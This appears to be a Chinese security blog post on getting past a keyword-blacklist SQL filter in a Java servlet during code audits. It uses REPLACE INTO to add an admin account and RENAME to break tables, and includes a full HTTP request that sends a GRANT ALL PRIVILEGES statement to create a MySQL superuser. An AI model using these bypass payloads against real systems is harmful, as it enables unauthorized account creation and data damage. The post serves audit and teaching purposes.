## 1.前言

看到标题的第一反应，大家可能感觉本文讲的是一些老套数，比如select/*xasdasdsa*/等等垃圾字符绕过，在平时代码审计项目中，遇到了很多白名单过滤，现实情况就是，根本不允许使用特定语句和方法，比如一些存在注入的代码中，明明有注入但是碰到了白名单过滤。洞就送在眼前了，只需要变通一下，就可以成为一个新的洞了。

## 2.代码审计

这里根据以往审计过程，过滤的代码。自己重现了一下。

如下是Filter过滤，在本文中，我过滤掉了增删改查等关键字。因为在注入中多数都是靠这几个函数来玩。

    
    
      
    

public class SQLFilter implements Filter {  
@Override  
public void init(FilterConfig filterConfig) throws ServletException {  
Filter.super.init(filterConfig);  
}

@Override  
public void destroy() {  
Filter.super.destroy();  
}

@Override  
public void doFilter(ServletRequest servletRequest, ServletResponse
servletResponse, FilterChain filterChain) throws IOException, ServletException
{

  
String sql = servletRequest.getParameter("sql");  
System.out.println(sql);

if (StrUtil.containsAnyIgnoreCase(sql, new CharSequence[]{"INSERT ", "SELECT
", "UPDATE ", "DELETE ", "DROP ", "ALTER ", "TRUNCATE ","/**/"})) {  
System.out.println("拦截到恶意SQL"+sql);  
servletResponse.getWriter().write("Error:"+sql);  
return;  
}

  
filterChain.doFilter(servletRequest,servletResponse);

  
}  
}

  

  
  
  

Controller层写的很简单，只是接收并直接执行SQL

![1690961686_64ca07164b167b787989a.png!small](https://image.3001.net/images/20230802/1690961686_64ca07164b167b787989a.png!small)

针对Filter的分析，其实可以发现过滤了增删改查这些操作。

![1690959341_64c9fded0b1772ef936a4.png!small](https://image.3001.net/images/20230802/1690959341_64c9fded0b1772ef936a4.png!small)

![1690959500_64c9fe8c8c48f7669bc0b.png!small](https://image.3001.net/images/20230802/1690959500_64c9fe8c8c48f7669bc0b.png!small)

拦截情况

![1690959945_64ca0049d28d208673f6b.png!small](https://image.3001.net/images/20230802/1690959945_64ca0049d28d208673f6b.png!small)

遇到这种情况，也就没有深究了，而是把思路转换到了其它函数上。可能和红队思路不同，红队希望能绕过利用，而白盒可能是为了造成危害即可水一个洞。

## 3\. 利用

### 3.1 replace into函数

![1690960263_64ca01879c2fd4be19451.png!small](https://image.3001.net/images/20230802/1690960263_64ca01879c2fd4be19451.png!small)

这个函数类似于insert 可以添加数据，在白盒中，我们肯定提前是知道mysql库和表结构的，比如此注入在前台中，就可以使用replace
into来对管理员表中添加一个新增账号，这样就可以登录后台进行更多获取权限的操作了。

![1690960351_64ca01df2b0b8ffabc029.png!small](https://image.3001.net/images/20230802/1690960351_64ca01df2b0b8ffabc029.png!small)

这里直接可以使用replace为表添加数据

![1690960941_64ca042d6e8065f62fa3a.png!small](https://image.3001.net/images/20230802/1690960941_64ca042d6e8065f62fa3a.png!small)

![1690960985_64ca04596ecfad6710886.png!small](https://image.3001.net/images/20230802/1690960985_64ca04596ecfad6710886.png!small)

  

### 3.2 添加Mysql用户

这里直接可以添加一个用户,账号Met32 密码 password

但是好像有权限或者版本问题，并不是百试百灵。如果在数据库port可以外连的情况，可以试一下

    
    
    POST /SqlExecute HTTP/1.1
    Host: 192.168.0.106:8987
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 97
    
    sql=GRANT+ALL+PRIVILEGES+ON+*.*+TO+'Met32'@'localhost'+IDENTIFIED+BY+'password'WITH+GRANT+OPTION;

![1690961270_64ca0576c9e0dd1f2c1c7.png!small](https://image.3001.net/images/20230802/1690961270_64ca0576c9e0dd1f2c1c7.png!small)

![1690961365_64ca05d5af47581e3e12f.png!small](https://image.3001.net/images/20230802/1690961365_64ca05d5af47581e3e12f.png!small)

![1690961390_64ca05ee89e2ebe483e6f.png!small](https://image.3001.net/images/20230802/1690961390_64ca05ee89e2ebe483e6f.png!small)

### 3.3 rename重命名

这就是纯纯搞破坏水洞了，黑盒不建议使用，本地白盒自己搭建的项目可以水一下

![1690961561_64ca06999228932322acf.png!small](https://image.3001.net/images/20230802/1690961561_64ca06999228932322acf.png!small)

![1690961641_64ca06e9043f835858dea.png!small](https://image.3001.net/images/20230802/1690961641_64ca06e9043f835858dea.png!small)

总体说也算个洞，就是水洞...

## 4.尾述

多去查一些冷门的函数，在一些开发都不知道的函数中，很可能有利用的情况。

